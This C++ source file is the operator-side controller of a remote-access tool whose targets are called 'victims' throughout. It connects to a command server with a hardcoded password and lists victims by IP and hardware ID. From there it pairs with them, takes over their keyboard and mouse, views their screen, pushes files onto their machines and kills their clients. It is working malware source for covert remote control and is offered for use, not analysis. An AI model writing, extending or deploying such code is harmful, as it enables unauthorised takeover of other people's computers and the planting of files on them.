#include "controller.h"

#include <comdef.h>
#include <Wbemidl.h>
#pragma comment(lib, "wbemuuid.lib")

Controller::Controller()
{    
    font.loadFromFile("./font.ttf");
    hardwareId = getHardwareId();

    //connect and initialize connection with server
    connectServer();

    //receive packets from array
    std::thread receive(&Controller::receiveInfo, this);
    receive.detach();

    //take user input from console
    std::thread input(&Controller::takeCmdInput, this);
    input.detach();
}
void Controller::controlWindow()
{
    auto screenSize = Mlib::displaySize();

    //set all keys to the current key states
    bool keys[256];
    for (int i = 0; i < 256; i++)
        keys[i] = Mlib::Keyboard::isKeyPressed(Mlib::Keyboard::Key(i));

    while (isRunning) {
        //send signal to server to keep awake
        if (Mlib::currentTime().asMil() - lastAwakeSignal > 2'000) {
            sf::Packet p;
            p << sf::Uint8('r');
            server.send(p);
            lastAwakeSignal = Mlib::currentTime().asMil();
        }

        //open window - connect server - skip
        if (!w.isOpen()) {
            //open window if needed
            if (isRunning && isConnected && isPaired && isControlling) {
                w.create(sf::VideoMode::getFullscreenModes()[0], "Controller", sf::Style::Fullscreen);
                w.setView(sf::View(sf::Vector2f(960, 540), sf::Vector2f(1920, 1080)));
                w.setFramerateLimit(20);

                if (!wallpaper.loadFromFile("./wallpaper.png")) {
                    sf::Image img;
                    img.create(w.getSize().x, w.getSize().y, sf::Color::Black);
                    wallpaper.loadFromImage(img);
                }   
            }
            //reconnect with server if needed
            else if (isRunning && !isConnected) {
                std::cout << "DISCONNECTED FROM SERVER\n";
                controllers.clear();
                victims.clear();
                connectServer();
                std::thread receive(&Controller::receiveInfo, this);
                receive.detach();
            }
            //sleep for a bit and continue
            else {
                Mlib::sleep(Mlib::milliseconds(50));
                continue;
            }
        }
        //close window if not controlling
        else if (!isControlling || !isPaired) {
            w.close();
            //stop controlling keyboard
            if (sendKeys) {
                sf::Packet p;
                p << sf::Uint8('z');
                server.send(p);
            }
            //stop controlling mouse
            if (sendMouse) {
                sf::Packet p;
                p << sf::Uint8('x');
                server.send(p);
            }
            if (sharingScreen) {
                sf::Packet p;
                p << sf::Uint8('g');
                server.send(p);
                sharingScreen = false;
            }
        }

        //catch windows events
        sf::Event e;
        while (w.pollEvent(e)) {
            if (e.type == sf::Event::Closed) {
                w.close();
                isControlling = false;
                //stop controlling keyboard
                if (sendKeys) {
                    sf::Packet p;
                    p << sf::Uint8('z');
                    server.send(p);
                }
                //stop controlling mouse
                if (sendMouse) {
                    sf::Packet p;
                    p << sf::Uint8('x');
                    server.send(p);
                }
            }
            else if (e.type == sf::Event::MouseWheelScrolled && sendMouse && !areSettingsOpen)
            {
                sf::Packet p;
                p << sf::Uint8('k') << sf::Int8(e.mouseWheelScroll.delta);
                server.send(p);
            }   
        }

        bool insState = Mlib::Keyboard::isKeyPressed(Mlib::Keyboard::Key(0x2D));
        //open settings
        if (insState && !keys[0x2D]) {
            areSettingsOpen = true;
            if (sendKeys) {
                sf::Packet p;
                p << sf::Uint8('z');
                server.send(p);
            }
        }
        //close settings
        else if (!insState && keys[0x2D]) {
            areSettingsOpen = false;
            if (sendKeys) {
                sf::Packet p;
                p << sf::Uint8('a');
                server.send(p);
            }
        }
        keys[0x2D] = insState;

        //send mouse position if needed
        auto mousePos = Mlib::Mouse::getPos();
        if (mousePos != lastMousePos && sendMouse) {
            float x = mousePos.x / float(screenSize.x), y = mousePos.y / float(screenSize.y);
            sf::Packet p;
            p << sf::Uint8('l') << sf::Uint16(x * 256 * 256) << sf::Uint16(y * 256 * 256);
            server.send(p);
        }
        lastMousePos = mousePos;

        //send keys and buttons pressed-released events if needed
        for (int i = 0; i < 256; i++) {
            //skip ins key
            if (i == 0x2D)
                continue;

            bool state = Mlib::Keyboard::isKeyPressed(Mlib::Keyboard::Key(i));
            bool isMouseButton = (i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06);
            bool releaseEvent = Mlib::Keyboard::getAsyncState(Mlib::Keyboard::Key(i));
            //send press/release event
            if ((!areSettingsOpen && !isMouseButton && sendKeys) || (isMouseButton && sendMouse)) {
                if (!state && keys[i]) {
                    sf::Packet p;
                    p << sf::Uint8('m') << sf::Uint8(i);
                    server.send(p);
                }
                else if (releaseEvent) {
                    sf::Packet p;
                    p << sf::Uint8('n') << sf::Uint8(i);
                    server.send(p);
                }
            }
            //toggle settings info
            if (areSettingsOpen && i >= 0x30 && i <= 0x39 && state && !keys[i]) {
                int key = i - 48;
                //close window
                if (key == 0) {
                    isControlling = false;
                }
                //control mouse
                else if (key == 1) {
                    sendMouse = !sendMouse;
                    if (sendMouse) {
                        sf::Packet p;
                        p << sf::Uint8('s');
                        server.send(p);
                    }
                    else {
                        sf::Packet p;
                        p << sf::Uint8('x');
                        server.send(p);
                    }
                }
                //send keys
                else if (key == 2) {
                    sendKeys = !sendKeys;
                }
                //send file
                else if (key == 3 && fileState < 0) {
                    std::thread sendFile(&Controller::startSendingFile, this);
                    sendFile.detach();
                }
                //start/stop screen sharing
                else if (key == 4) {
                    sharingScreen = !sharingScreen;
                    if (sharingScreen) {
                        sf::Packet p;
                        p << sf::Uint8('b') << sf::Uint16(0) << sf::Uint16(0) << sf::Uint16(10'000) << sf::Uint16(10'000);
                        server.send(p);
                    }
                    else {
                        sf::Packet p;
                        p << sf::Uint8('g');
                        server.send(p);
                    }
                }
            }

            keys[i] = state;
        }

        //draw everything
        sf::RectangleShape rect(sf::Vector2f(1920, 1080));
        if (!sharingScreen)
            rect.setTexture(&wallpaper);
        else
            rect.setTexture(&screen);
        w.draw(rect);

        std::string str("SETTINGS [ins] = ");
        str += ((areSettingsOpen) ? "OPEN\n" : "CLOSED\n");
        str += "MOUSE [1] = ";
        str += ((sendMouse) ? "ACTIVE\n" : "INACTIVE\n");
        str += "KEYBOARD [2] = ";
        str += ((sendKeys) ? "ACTIVE\n" : "INACTIVE\n");
        str += "FILE [3] = ";
        if (fileState == -1)
            str += "READY";
        else if (fileState == -2) 
            str += "SENT - READY";
        else if (fileState == -3)
            str += "FAILED - READY";
        else if (fileState > 0)
            str += std::to_string(fileState) + "/" + std::to_string(fileSize) + 
            " BYTES - " + std::to_string(int((fileState * 100.f) / fileSize)) + "%";
        str += "\nSCREEN SHARING [4] = ";
        str += ((sharingScreen) ? "ACTIVE\n" : "INACTIVE\n");

        sf::Text txt(str, font, 20);
        txt.setStyle(sf::Text::Bold);
        txt.setFillColor(sf::Color(200, 200, 200));
        txt.setPosition(8, 6);
        txt.setLineSpacing(1.4f);
        w.draw(txt);

        w.display();
    }
}

void Controller::receiveInfo()
{
    while (true) {
        sf::Packet p;
        server.receive(p);
        //disconnect server if packet is invalid
        if (p.getDataSize() == 0) {
            isConnected = false, isPaired = false, isControlling = false;
            break;
        }

        sf::Uint8 cmd;
        p >> cmd;

        //display clients info
        if (cmd == 'd') {
            controllers.clear();
            victims.clear();

            updateClientsList(p);
        }
        //apparently controller isn't initialized
        else if (cmd == '?') {
            isConnected = false, isPaired = false, isControlling = false;
            break;
        }
        //pair controller with victim
        else if (cmd == 'p')
        {
            isPaired = true;
            isControlling = false;
        }
        //un-pair controller with victim
        else if (cmd == 'u')
        {
            isPaired = false;
            isControlling = false;
        }
        //exit program
        else if (cmd == 'e') {
            isRunning = false;
        }
        //send next file packet
        else if (cmd == 'y') {
            if (file != nullptr && file->is_open()) {
                char* buffer = new char[20'480];
                file->read(buffer, 20'480);
                size_t bytesRead = file->gcount();

                if (bytesRead > 0) {
                    sf::Packet p;
                    p << sf::Uint8('o');
                    p.append(buffer, bytesRead);
                    server.send(p);

                    if (fileState <= 0)
                        fileState = static_cast<int>(bytesRead);
                    else
                        fileState += static_cast<int>(bytesRead);
                }
                else {
                    file->close();
                    delete file; 
                    file = nullptr;

                    fileState = -2;
                    p.clear();
                    p << sf::Uint8('i') << ext;
                    server.send(p);
                }
            }
            else {
                p.clear();
                p << sf::Uint8('h');
                server.send(p);
            }
        }
        //file fail
        else if (cmd == 'h') {
            if (file == nullptr)
                continue;

            fileState = -3;
            file->close();
            delete file;
            file = nullptr;
        }
        //receive frame
        else if (cmd == 't') {
            auto data = static_cast<const char*>(p.getData());
            data++;

            sf::Image img;
            img.create(1280, 720);

            for (int y = 0; y < 720; y++) {
                for (int x = 0; x < 1280; x++) {
                    auto col = data[y * 1280 + x];

                    img.setPixel(x, y, sf::Color(col, col, col));
                }
            }

            screen.loadFromImage(img);
        }
    }
}
void Controller::takeCmdInput()
{
    while (true) {
        //take input from console
        std::string cmd;
        getline(std::cin, cmd);

        if (!isConnected)
            continue;

        while (cmd.size() > 0 && cmd[0] == ' ')
            cmd.erase(cmd.begin());
        while (cmd.size() > 0 && cmd[cmd.size() - 1] == ' ')
            cmd.erase(cmd.begin() + cmd.size() - 1);

        //connect to a given victim
        if (cmd.substr(0, 4) == "pair" && !isPaired) {
            cmd.erase(0, 4);

            //convert string to  number and check if it is valid
            int num = 0;
            try {
                num = stoi(cmd);
            } 
            catch (std::invalid_argument e) {
                continue;
            } 
            catch (std::out_of_range e) {
                continue;
            }

            //check if victim with that id exists
            for (const auto& v : victims) {
                if (v.id != num)
                    continue;

                sf::Packet p;
                p << sf::Uint8('p') << v.id;
                server.send(p);
                break;
            }
        }
        //disconnect a given client
        else if (cmd.substr(0, 6) == "unpair") {
            cmd.erase(0, 6);

            int num = 0;
            try {
                num = stoi(cmd);
            }
            catch (std::invalid_argument e) {
                bool exit = false;
                for (int i = 0; i < cmd.size(); i++) {
                    if (cmd[i] != ' ') {
                        exit = true;
                        break;
                    }
                }

                if (exit)
                    continue;
                else
                    num = id;
            }
            catch (std::out_of_range e) {
                continue;
            }

            //check if client with that id exists
            for (const auto& v : victims) {
                if (v.id != num)
                    continue;
                if (v.otherId == 0)
                    break;

                sf::Packet p;
                p << sf::Uint8('u') << v.id;
                server.send(p);
                break;
            }
            for (const auto& c : controllers) {
                if (c.id != num)
                    continue; 
                if (c.otherId == 0)
                    break;

                sf::Packet p;
                p << sf::Uint8('u') << c.id;
                server.send(p);
                break;
            }
        }
        //start controlling the victim
        else if (cmd.substr(0, 7) == "control" && isPaired) {
            Mlib::sleep(Mlib::milliseconds(500));
            isControlling = true, sendKeys = false, sendMouse = false, areSettingsOpen = false;
        }
        //kill a given client
        else if (cmd.substr(0, 4) == "kill") {
            cmd.erase(0, 4);

            //convert string to  number and check if it is valid
            int num = 0;
            try {
                num = stoi(cmd);
            }
            catch (std::invalid_argument e) {
                continue;
            }
            catch (std::out_of_range e) {
                continue;
            }

            //check if client with that id exists
            for (const auto& v : victims) {
                if (v.id != num)
                    continue;

                sf::Packet p;
                p << sf::Uint8('e') << v.id;
                server.send(p);
                break;
            }
            for (const auto& c : controllers) {
                if (c.id != num)
                    continue;

                sf::Packet p;
                p << sf::Uint8('e') << c.id;
                server.send(p);
                break;
            }
        }
        //rename a given client
        else if (cmd.substr(0, 4) == "name") {
            cmd.erase(0, 4);
            //check if input is valid
            if (cmd.find(':') == std::string::npos)
                continue;

            //convert string to  number and check if it is valid
            int num = 0;
            try {
                num = stoi(cmd.substr(0, cmd.find(':')));
            }
            catch (std::invalid_argument e) {
                continue;
            }
            catch (std::out_of_range e) {
                continue;
            }

            //remove spaces from before and after the string
            std::string newName = cmd.substr(cmd.find(':') + 1, cmd.size() - 1);
            while (newName.size() > 0 && newName[0] == ' ')
                newName.erase(newName.begin());
            while (newName.size() > 0 && newName[newName.size() - 1] == ' ')
                newName.erase(newName.begin() + newName.size() - 1);

            //check if client with that id exists
            for (const auto& v : victims) {
                if (v.id != num)
                    continue;

                sf::Packet p;
                p << sf::Uint8('w') << v.id << newName;
                server.send(p);
                break;
            }
            for (const auto& c : controllers) {
                if (c.id != num)
                    continue;

                sf::Packet p;
                p << sf::Uint8('w') << c.id << newName;
                server.send(p);
                break;
            }
        }
        //ask for admin
        else if (cmd.substr(0, 4) == "pass") {
            cmd.erase(0, 4);
            //check if input is valid
            if (cmd.find(':') == std::string::npos)
                continue;

            //convert string to  number and check if it is valid
            int num = 0;
            try {
                num = stoi(cmd.substr(0, cmd.find(':')));
            }
            catch (std::invalid_argument e) {
                bool exit = false;
                for (int i = 0; i < cmd.find(':'); i++) {
                    if (cmd[i] != ' ') {
                        exit = true;
                        break;
                    }
                }

                if (exit)
                    continue;
                else
                    num = id;
            }
            catch (std::out_of_range e) {
                continue;
            }

            //remove spaces from before and after the string
            std::string pass = cmd.substr(cmd.find(':') + 1, cmd.size() - 1);
            while (pass.size() > 0 && pass[0] == ' ')
                pass.erase(pass.begin());
            while (pass.size() > 0 && pass[pass.size() - 1] == ' ')
                pass.erase(pass.begin() + pass.size() - 1);

            //check if controller with that id exists
            for (const auto& c : controllers) {
                if (c.id != num)
                    continue;

                sf::Packet p;
                p << sf::Uint8('q') << c.id << pass;
                server.send(p);
                break;
            }
        }
    }
}

void Controller::connectServer()
{
connect:
    //connect to server
    while (server.connect(SERVER_IP, SERVER_PORT) != sf::Socket::Done)
        sf::sleep(sf::seconds(5));

    std::cout << "connected with server\n";
    int fails = 0;

init:
    sf::Packet p;
    //tell server the role and the hardware id
    p << sf::Uint8('c') << CONTROLLER_PASS << hardwareId;
    server.send(p);

    p.clear();
    if (server.receive(p) == sf::Socket::Disconnected)
        goto connect;

    sf::Uint8 role;
    p >> role;
    //connection approved
    if (role == sf::Uint8('c')) {
        //get the connection id
        p >> id;
        std::cout << "connection with server approved\n";

        isConnected = true;
    }
    //this is an old version
    else if (role == sf::Uint8('<')) {
        std::cout << "server rejected the connection because of version mis-match\n";
        std::cout << "download a newer version from http://" << SERVER_IP << ":8000\n";
        while (true)
            Mlib::sleep(Mlib::seconds(10));
    }
    //unknown error (try 10 times)
    else {
        //try at least 10 times
        if (fails < 10) {
            fails++;
            Mlib::sleep(Mlib::seconds(5));
            goto init;
        }
        else {
            std::cout << "server rejected the connection for unknown reasons";
            std::cout << "try downloading a newer version from http://" << SERVER_IP << ":8000\n";
            while (true)
                Mlib::sleep(Mlib::seconds(10));
        }
    }

}
void Controller::updateClientsList(sf::Packet& p)
{
    sf::Uint16 numClients;
    p >> numClients;
    //retrieve all information from the packet
    for (int i = 0; i < numClients; i++) {
        sf::Uint8 role;
        sf::Uint32 integerIp;
        Client c;
        p >> role >> c.id >> c.otherId >> c.name >> c.hardwareId >> integerIp >> c.port >> c.isAdmin;
        c.ip = sf::IpAddress(integerIp).toString();

        if (role == 'c')
            controllers.push_back(c);
        else if (role == 'v')
            victims.push_back(c);
    }

    system("CLS");
    std::cout << "update time: " << int(Mlib::currentTime().asSec()) << " - id: " << id << "\n";

    std::cout << "\nCONTROLLERS:\n";
    //output information for each controller
    for (const auto& c : controllers) {
        std::cout << "   id: " << c.id << " [" << c.name << "]" << ((c.id == id) ? " (you)" : "");
        std::cout << " = " << c.hardwareId << " - " << c.ip << ':' << c.port;

        if (c.otherId == 0)
            std::cout << " - not paired";
        else
            std::cout << " - paired with " << c.otherId;

        if (c.isAdmin)
            std::cout << " - ADMIN";
        std::cout << "\n";
    }

    std::cout << "\nVICTIMS:\n";
    //output information for each victim
    for (const auto& v : victims) {
        std::cout << "   id: " << v.id << " [" << v.name << "] = " << v.hardwareId; 
        std::cout << " - " << v.ip << ':' << v.port;
        
        if (v.otherId == 0)
            std::cout << " - not paired\n";
        else {
            std::cout << " - paired with " << v.otherId;
            if (v.otherId == id)
                std::cout << " (you)";
            std::cout << '\n';
        }
    }

    std::cout << '\n';
}
std::string Controller::getHardwareId()
{
    std::string hardwareIdString = "";

    DWORD volumeSerialNumber = 0;
    BOOL result = GetVolumeInformationA("C:\\", 0, 0, &volumeSerialNumber, 0, 0, 0, 0);
    if (result) {
        char serialNumber[9];
        sprintf_s(serialNumber, "%08X", volumeSerialNumber);

        for (int i = 0; i < 8; i++)
            hardwareIdString += serialNumber[i];
    }
    else {
        std::cout << "failed to retrieve volume serial number, error: " << GetLastError();
    }

    HRESULT hres;

    //initialize COM
    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) {
        std::cout << "Failed to initialize COM library. Error code = 0x" << std::hex << hres;
    }

    //set general COM security levels
    hres = CoInitializeSecurity(0, -1, 0, 0, RPC_C_AUTHN_LEVEL_DEFAULT,
        RPC_C_IMP_LEVEL_IMPERSONATE, 0, EOAC_NONE, 0);
    if (FAILED(hres)) {
        std::cout << "Failed to initialize security. Error code = 0x" << std::hex << hres;
        CoUninitialize();
    }

    //obtain the initial locator to WMI
    IWbemLocator* pLoc = NULL;
    hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
        IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hres)) {
        std::cout << "Failed to create IWbemLocator object. Error code = 0x" << std::hex << hres;
        CoUninitialize();
    }

    //connect to WMI through the IWbemLocator::ConnectServer method
    IWbemServices* pSvc = NULL;
    hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), 0, 0, 0, 0, 0, 0, &pSvc);
    if (FAILED(hres)) {
        std::cout << "Could not connect. Error code = 0x" << std::hex << hres;
        pLoc->Release();
        CoUninitialize();
    }

    //set security levels on the proxy
    hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, 0,
        RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, 0, EOAC_NONE);
    if (FAILED(hres)) {
        std::cout << "Could not set proxy blanket. Error code = 0x" << std::hex << hres;
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
    }

    //use the IWbemServices pointer to make requests of WMI
    IEnumWbemClassObject* pEnumerator = NULL;
    hres = pSvc->ExecQuery(bstr_t("WQL"), bstr_t("SELECT UUID FROM Win32_ComputerSystemProduct"),
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, 0, &pEnumerator);
    if (FAILED(hres)) {
        std::cout << "Query for UUID failed. Error code = 0x" << std::hex << hres;
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
    }

    //get the data from the query
    IWbemClassObject* pclsObj = NULL;
    ULONG uReturn = 0;
    while (pEnumerator) {
        HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
        if (uReturn == 0)
            break;

        //get the value of the UUID property
        VARIANT vtProp;
        VariantInit(&vtProp);
        hr = pclsObj->Get(L"UUID", 0, &vtProp, 0, 0);
        std::wstring ws(vtProp.bstrVal, SysStringLen(vtProp.bstrVal));
        std::string uuid(ws.begin(), ws.end());

        VariantClear(&vtProp);
        pclsObj->Release();

        uuid.erase(std::remove(uuid.begin(), uuid.end(), '-'), uuid.end());
        hardwareIdString += uuid;
    }

    pSvc->Release();
    pLoc->Release();
    pEnumerator->Release();
    CoUninitialize();

    return hardwareIdString;
}

void Controller::startSendingFile()
{   
    //get the file path
    std::string path = Mlib::getOpenFilePath("All Files (*.*)\0*.*\0");
    file = new std::ifstream(path, std::ios::binary | std::ios::in);
    if (!file->is_open())
        return;

    //get the size of the file
    file->ignore(std::numeric_limits<std::streamsize>::max());
    fileSize = int(file->gcount());
    file->seekg(0);

    //store the extention for later
    ext = path.substr(path.find_first_of('.'));

    //create file on victim
    sf::Packet p;
    p << sf::Uint8('f');
    server.send(p);
}
